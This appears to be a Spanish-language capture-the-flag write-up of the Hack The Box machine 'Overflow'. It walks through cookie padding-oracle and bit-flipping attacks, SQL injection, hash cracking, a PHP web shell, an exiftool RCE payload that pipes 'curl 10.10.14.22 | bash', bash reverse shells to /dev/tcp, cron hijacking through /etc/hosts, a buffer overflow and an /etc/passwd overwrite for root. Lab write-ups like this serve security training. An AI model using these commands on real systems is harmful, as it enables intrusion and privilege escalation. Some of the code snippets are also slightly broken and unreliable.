---
layout: post
author: Sergio Salgado
---

|     Iformation         |      Link          |
|:-----------------------|:-------------------|
| Name                   | Overflow           |
| Os                     | Linux              |
| Difficulty             | Hard               |
| Points                 | 0                  |
| IP                     | 10.10.11.119       |

## [](#header-2)Reconocimiento

Primero utilizaremos la herramienta que hace la identificación de conexión silenciosa y reconocimiento del sistema al que nos presentamos.

![Scan 1](/assets/images/Overflow/scan1.png)

### [](#header-3)NMAP   

El primer escaneo rápido con nmap, para poder agilizar mientras más búsquedas o búsqueda de vulnerabilidades sobre esos puertos.

```s
sudo nmap -p- --open -sS --min-rate 5000 -vvv 10.10.11.119
```

![nmap 1](/assets/images/Overflow/nmap1.png)

El segundo escaneo, ya un poco más profundo será:

```s
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.119 -oG allPorts
```

![nmap2](/assets/images/Overflow/nmap2.png)

Después de tener los puertos, se puede hacer un escaneo ahora directo a los puertos con:

```s
sudo nmap -sCV -p22,25,80 10.10.11.119 -oN targeted
```

![nmap 3](/assets/images/Overflow/nmap3.png)

En el pie de pagina del sitio del puerto 80 podemos ver un dominio potencial que es overflow.htb, procederemos a agregarlo a nuestro /etc/hosts para ver como funciona ahora el sitio.

Enumeramos directorios con wfuzz:

Para intentar ver si es vulnerable a ataques de CBC que es romper con el cifrado de las cookies de sesion, hay maneras automatizadas como padbuster. Para probarlo necesitamos crearnos un usuario en la pagina de overflow del puerto 80 y al inspeccionar el codigo de la pagina, dirigirnos a la ventana de storage para copiar la cookie:

![cookie](/assets/images/Overflow/coockie.png)

Y para usar el padbuster la sintaxis es:

```s
padbuster http://overflow.htb/home/index.php -cookies "auth=Js8rfw9ravfrP3iW5cDXtfZWMBWKvDpt" 8
```

La otra manera de testear esto, es agregando un usuario que se llame en este ejemplo bdmin, con contrasena bdmin tambien. Recargamos el index.html para pasarlo al burpsuite y seguimos los pasos siguientes:

![create bdmin](/assets/images/Overflow/create_bdmin.png)

Pasamos la peticion interceptada al intruder con CTRL+I, nos vamos a la parte de positions y seleccionamos la opcion Sniper, como vemos el target ya esta en la cookie.

![intruder positions](/assets/images/Overflow/intruder_positions.png)

Despues nos iremos a la parte de payloads y seleccionamos Bit Flipper, con los parametros siguientes:

![intruder payloads](/assets/images/Overflow/intruder_payloads.png)

Y ahora en la nueva ventana podemos filtrar por el tamano de la respuesta, que en este caso usaremos la de codigo 200 que es:

![admin cookie](/assets/images/Overflow/admin_cookie.png)

Despues solo habra que robar la cookie insertandola en la memoria de navegador como obtuvimos la pasada y podremos ver el panel de administrador

![admin panel](/assets/images/Overflow/admin_panel.png)

Ahora tenemos que acceder al cms, a traves del boton de admin panel.

Lo siguiente que podemos intentar es obtener la contrasena de admin, que no es necesario porque rapidamente podemos brincar al otro paso:

```s
padbuster http://overflow.htb/home/index.php -cookies "auth=7O5yXmlk%2Fjlk0ZW53DbJJfJt2Hb0ECG8" 8 -plaintext user=admin
```

Si fuzzeamos el directorio de cms, podemos ahora ver que existe el archivo /admin_cms_panel/doc/CHANGELOG.txt y por otro lado donde estaremos aplicando las inyecciones de SQL que estan en el ejemplo de SQLI en el blog:

![SQLI](/assets/images/Overflow/admin_hash.png)

Ahora hemos conseguido el hash de administrador que guardaremos en un archivo llamado credentials, que intentaremos crackear con john, para saber el tipo de hash es hay una herramienta llamada hashid y en seguida solo habra que meter el hash. Guiado con el exploit de metasploit para el cms, haremos un pequeno script en python que nos ayude a crackear este hash.

```py
#!/usr/bin/python3

import hashlib

salt='6c2d17f37e226486'
password2='c6c6b9310e0e6f3eb3ffeb2baff12fdd'
password1='e3d748d58b58657bfa4dffe2def0b1c7'
dictionary = '/usr/share/wordlists/rockyou.txt'

f = open(dictionary, "rb")

for possible_pass in f.readlines(): 
    possible_pass = possible_pass.strip()

    if hashlib.md5(salt.encode() + possible_pass).hexdigest() == password1:

        print("[+] La password admin es %s" % possible_pass.decode()) 
        break

```

Hemos dado con la password de editor:

![editor password](/assets/images/Overflow/editor_password.png)

Intente entrar por ssh con esta contrasena pero no fue posible, asi que intentaremos usarla para el cms. 
Una vez dentro intentamos meter una reverse shell y veremos que no es posible ejecutar la reverse, pero si abrimos user defined tags despues de ejecutar el comando, podremos ver una ventana que nos muestra otro subdominio que agregaremos en el /etchosts.

![cms reverse](/assets/images/Overflow/cms_reverse.png)

![subdomain](/assets/images/Overflow/subdomain.png)

Tenemos ahora otro panel de autenticacion, en el cual usaremos las mismas credenciales de editor para acceder

![dev panel](/assets/images/Overflow/dev_panel.png)

Una vez dentro para seguir avanzando, tenemos que ir a nuestro perfil y veremos que es posible subir un curriculum.

Ahora lo que intentaremos es subir un archivo php con el siguiente contenido:

```php
<?php
    echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>"
?>
```

 No fue posible subir el archivo PHP, pero si es posible interceptar el response de la imagen cargada y veremos que se esta usando el exiftool, una manera de abusar de esta herramienta es inyectandole un comentario en php:

 ```php
exiftool -Comment="<?php system('whoami'); >" 
 ```

 Esto tampoco funciono, pero esta bien tenerlo en cuenta para siguientes ataques.
 Como sabemos la version del exiftool, podemos buscar alguna vulnerabilidad aplicable y la que usaremos <a href="https://github.com/OneSecCyber/JPEG_RCE.git">este proyecto</a> 

La forma de usarlo es:

 ```s
exiftool -config eval.config runme.jpg -eval='system("curl 10.10.14.22 | bash")'
 ```

 Ahora lo que haremos es crearnos un html con lo siguiente:

 ```html
#!/bin/bash

bash -i >& /dev/tcp/10.10.14.22/443 0>&1
```

Y nos montamos un servidor en python para recibir mandar el archivo html

```py
python -m http.server 80
```

Ahora con netcat nos ponemos en escucha por el puerto 443 y subimos el archivo. Inmediatamente se ejecutara y obtendremos ahora acceso a la maquina.

![access](/assets/images/Overflow/acces.png)

En el directorio de db.php podremos encontrar un usuario y contrasena que son para developer.

![developer password](/assets/images/Overflow/developer.png)

![developer owned](/assets/images/Overflow/developer_owned.png)

Ahora podemos ver que tenemos en primera acceso al archivo /etc/hosts, y encontramos tambien un archivo que ejecuta un script en un dominio cada cierto tiempo en /opt/commontask.sh sobre un dominio que no existe "taskmanage.overflow.htb". Asi que ahora podemos crear un archivo llamado task.sh que se encargue de hacer una reverse shell

```sh
#!/bin/bash

bash -i >& /dev/tcp/10.10.14.22/443 0>&1
```

Y agregar en el archivo /etc/hosts sobre ese dominio que vimos nuestra ip para que se descargue el archivo para que se ejecute. Pero antes tenemos que ponernos en escucha por el puerto 443 e iniciar el servidor con python.

Hemos tenido acceso ahora para este usuario, intente conectarme por ssh generando la llave id_rsa pero no fue posible. Asi que continue asi.

![tester owned](/assets/images/Overflow/tester.png)

Ahora lo que falta es meternos en el directorio root. En el directorio /opt vemos un directorio encrypt en el que tenemos acceso y vemos un binario, el cual nos pasaremos a nuestra maquina de la manera siguiente:

```s
#Maquina que envia
nc 10.10.14.22 443 < file_encrypt
#Maquina que recibe
nc -nlvp 4444 > file
```

Ahora para analizar el desbordamiento de buffer vamos a usar la herramienta gdb de la manera siguiente
que hay que clonar del repositorio de linux, por que de apt esta desactualizado.

```s
#Puede no compilarse en arch linux, asi que se usaria tambien el siguiente script
LC_ALL=en_US.UTF-8 gdb ./file_encrypt

#Para listar las funciones existentes
info functions

#Para desensamblar una funcion
disass random

#para meter un breakpoint en random (Punto donde se pare el programa)
break *random+57

#Para correr el programa
r

#Para generar un patron
Pattern create
```

![Info functions](/assets/images/Overflow/info_functions.png)


Para crearnos el codigo de acuerdo a lo visto en el interior del codigo desarmado, y llegar al desbordamiento en la parte de name, podemos hacer un codigo al siguiente para obtener el codigo:

```py
#!/usr/bin/python3
i = 0
local_c = 0x6b8b4567
initial_local_c = 0x6b8b4567

while (i < 10):
    local_c * 0x59 + 0x14
    i += 1

print(c_init(types.local_c ^ initial_local_c).value)
```

Una vez teniendo el codigo que es -202976456 ahora nos pedira el programa el nombre, que para desbordar el bufer y poder pasar a la siguiente parte, podemos hacer con python un:

```py
python3 -c 'print("A"*44 + "\x5b\x58\x55\x56" )'
```

Entonces, ahora que tenemos control de este binario, podemos hacer un programa que escriba por nosotros en algun archivo que este controlado por root. Nos desplazamos a /tmp y creamos el archivo file.txt y el del programa encrypt.py

```py
#!/usr/bin/python3

plaintext_file = "/tmp/file.txt"
output_encrypted_file = "/tmp/file.encrypted"

plaintext = open(plaintext_file, "rb").read()
output = open(output_encrypted_file, "wb")

for line in plaintext:
    output.write(bytes([line ^ 0x9b]))
```

Ahora sacamos la contrasena de openssl 

```s
openssl passwd
DAerOppJInwQI
```

Se lo modificamos al campo de root como esta en la imagen:

![Root new password](/assets/images/Overflow/root_pass.png)

Ahora le cambiaremos el nombre al file.txt a passwd y modificaremos el codigo de la manera siguiente:

![Code modified](/assets/images/Overflow/code_modify.png)

Ejecutamos nuevamente el programa para tener el passwd.encrypted y ahora que lo tenemos encriptado, como se opera con un xor la encryptacion podemos usar nuevamente el binario para modificar este passwd.encrypted y mandarlo al /etc/passwd desencriptado.

![Binary executed](/assets/images/Overflow/binary_executed.png)

Hemos podido manipular la contrasena de root ahora y podremos escalarlo con un su root

![Passwd modified](/assets/images/Overflow/etc_modified.png)

![Root owned](/assets/images/Overflow/root.png)

![Powned](/assets/images/Overflow/powned.png)